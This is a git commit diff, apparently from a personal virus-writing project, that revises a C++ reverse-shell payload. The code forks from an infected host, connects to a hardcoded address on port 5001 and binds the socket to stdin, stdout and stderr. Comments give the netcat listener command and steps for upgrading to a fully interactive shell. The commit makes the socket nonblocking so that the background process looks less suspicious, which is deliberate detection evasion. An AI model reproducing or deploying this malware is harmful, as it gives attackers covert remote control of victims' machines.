ea0049521acadd04a9c85612bec243dbfb7130bc
Tim Tianyang Chen <soapcn@gmail.com>
2024-07-28 21:20:39 -0700

    [virus] improve reverse shell virus
    Make the reverse shell virus nonblocking.

--- virus/reverse_shell.cc
+++ virus/reverse_shell.cc
@@ -6,37 +6,38 @@
 // server shell access. The infected host will still run as is and terminate but
 // the forked child will stay connected to our remote server.
 // listen with:
-//   nc -k -l 5001
-// upgrade from shell to bash with:
-//   SHELL=/bin/bash script -q /dev/null
-// background the current shell with ^z
-// update the local terminal line settings with stty2 and bring the remote shell
-// back
-//   stty raw -echo && fg
-// reset terminal to type linux
-//   reset
-//   export TERM=xterm-256color
+//      nc -k -l 5001
+// On client:
+// 1: upgrade from shell to bash with:
+//      SHELL=/bin/bash script -q /dev/null
+// 2: background the current shell with ^z
+// 3: update the local terminal line settings with stty2 and bring the remote
+//    shell back
+//      stty raw -echo && fg
+// 4: reset terminal to type linux
+//      reset
+//      export TERM=xterm-256color
 // You should then have a fully interactive shell with command history/auto
 // complete + functional vim.
 int main() {
-  struct sockaddr_in sa;
-  int s;
-
-  sa.sin_family = AF_INET;
-  // Connect to server
-  sa.sin_addr.s_addr = vf::inet_addr(192, 168, 50, 60);
-  sa.sin_port = htons(5001);
-
-  s = vf::socket(AF_INET, SOCK_STREAM, 0);
-  if (vf::connect(s, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
-    // Give up if we cannot connect. To make things more sophisticated, we could
-    // fork and sleep/retry periodically.
-    return 0;
-  }
-
   auto new_pid = vf::fork();
+
   // If we are parent or failed to fork return control to host.
   if (new_pid == 0) {
+    ::sockaddr_in sa{};
+    sa.sin_family = AF_INET;
+    // Connect to server
+    sa.sin_addr.s_addr = vf::inet_addr(192, 168, 50, 60);
+    sa.sin_port = htons(5001);
+
+    // Important: make the socket nonblocking because we don't want a long
+    // running process in background that can be suspicious.
+    int s = vf::socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+    // Ignore the return value here since nonblocking mode can return -1 if the
+    // connection is in progress. If the connection indeed failed, dup2 would
+    // fail.
+    vf::connect(s, (sockaddr*)&sa, sizeof(sa));
+
     if (vf::dup2(s, STDIN_FILENO) < 0 || vf::dup2(s, STDOUT_FILENO) < 0 ||
         vf::dup2(s, STDERR_FILENO) < 0) {
       return 0;
